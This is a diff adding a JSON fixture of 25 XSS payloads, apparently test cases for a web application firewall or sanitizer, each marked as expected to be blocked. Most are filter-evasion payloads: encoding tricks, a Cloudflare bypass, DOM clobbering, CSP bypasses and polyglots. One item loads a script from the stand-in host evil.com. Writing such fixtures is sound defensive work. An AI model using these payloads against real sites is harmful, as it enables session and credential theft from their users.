@@ -1,0 +1,227 @@
+[
+    {
+      "id": "xss-adv-001",
+      "payload": "<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>",
+      "tags": ["xss", "unicode-escape", "bypass"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "XSS with Unicode escape sequences for 'alert'",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-002",
+      "payload": "\\uFF1Cscript\\uFF1Ealert(1)\\uFF1C/script\\uFF1E",
+      "tags": ["xss", "fullwidth", "bypass"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "XSS with fullwidth characters for < and >",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-003",
+      "payload": "%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E",
+      "tags": ["xss", "utf32", "bypass"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "XSS with UTF-32 encoding",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-004",
+      "payload": "+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
+      "tags": ["xss", "utf7", "bypass"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "XSS with UTF-7 encoding",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-005",
+      "payload": "<a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;\">X</a>",
+      "tags": ["xss", "html-entities", "cloudflare-bypass"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "Cloudflare bypass using HTML entities and whitespace",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-006",
+      "payload": "゙ア='',゙セ=!゙ア+゙ア,゙エ=!゙セ+゙ア,゙ソ=゙ア+{},゙ト=゙セ[゙ア++]",
+      "tags": ["xss", "katakana", "bypass"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "JSFuck-style XSS using Katakana characters",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-007",
+      "payload": "𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{}",
+      "tags": ["xss", "cuneiform", "bypass"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "XSS using Cuneiform script characters",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-008",
+      "payload": "ᨒ='',ᨕ=!ᨒ+ᨒ,ᨖ=!ᨕ+ᨒ,ᨘ=ᨒ+{}",
+      "tags": ["xss", "lontara", "bypass"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "XSS using Lontara script characters",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-009",
+      "payload": "<img src=x onerror=`alert\\`1\\``>",
+      "tags": ["xss", "template-literal", "es6"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "XSS using ES6 template literals",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-010",
+      "payload": "<img src=x onerror=alert?.(`1`)>",
+      "tags": ["xss", "optional-chaining", "es2020"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "XSS using ES2020 optional chaining",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-011",
+      "payload": "<img src=x onerror=\\141\\154\\145\\162\\164(1)>",
+      "tags": ["xss", "octal-escape", "bypass"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "XSS with octal-encoded 'alert'",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-012",
+      "payload": "<form id=x><output id=y>XSS</output>",
+      "tags": ["xss", "dom-clobbering", "form"],
+      "expected_block": true,
+      "severity_hint": "medium",
+      "notes": "DOM clobbering via form/output elements",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-013",
+      "payload": "<a id=x><a id=x name=y href=\"javascript:alert(1)\">",
+      "tags": ["xss", "dom-clobbering", "collection"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "DOM clobbering via DOM collection",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-014",
+      "payload": "<iframe name=a srcdoc=\"<iframe srcdoc='<a/id=c/name=d/href=http://evil.com>'></iframe>\">",
+      "tags": ["xss", "dom-clobbering", "nested-iframe"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "Deep DOM clobbering via nested iframes",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-015",
+      "payload": "<script src=\"data:text/javascript,alert(1)\"></script>",
+      "tags": ["xss", "data-uri", "csp-bypass"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "XSS via data: URI script src",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-016",
+      "payload": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
+      "tags": ["xss", "meta-refresh", "bypass"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "XSS via meta refresh to javascript:",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-017",
+      "payload": "f=document.createElement(\"iframe\");f.src=\"/robots.txt\";f.onload=()=>{x=document.createElement('script');x.src='//evil.com/xss.js';f.contentWindow.document.body.appendChild(x)};document.body.appendChild(f);",
+      "tags": ["xss", "csp-bypass", "iframe"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "CSP bypass via iframe contentWindow",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-018",
+      "payload": "/?xss=<script>alert(1)</script>&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a",
+      "tags": ["xss", "csp-bypass", "parameter-limit"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "PHP CSP bypass via max_input_vars (1000 params)",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-019",
+      "payload": "<object data=\"javascript:alert(1)\">",
+      "tags": ["xss", "object-tag"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "XSS via object tag data attribute",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-020",
+      "payload": "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x\">",
+      "tags": ["xss", "svg-use", "data-uri"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "XSS via SVG use element with data URI",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-021",
+      "payload": "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
+      "tags": ["xss", "mathml", "html-smuggling"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "XSS via MathML HTML smuggling",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-022",
+      "payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+      "tags": ["xss", "noscript", "parser-trick"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "XSS via noscript parser differential",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-023",
+      "payload": "<!--><script>alert(1)/*-->*/</script>",
+      "tags": ["xss", "html-comment", "bypass"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "XSS via HTML comment trick",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-024",
+      "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+      "tags": ["xss", "polyglot"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "Multi-context XSS polyglot",
+      "category": "XSS"
+    },
+    {
+      "id": "xss-adv-025",
+      "payload": "'-alert(1)-'",
+      "tags": ["xss", "js-context", "string-escape"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "XSS in JavaScript string context",
+      "category": "XSS"
+    }
+]
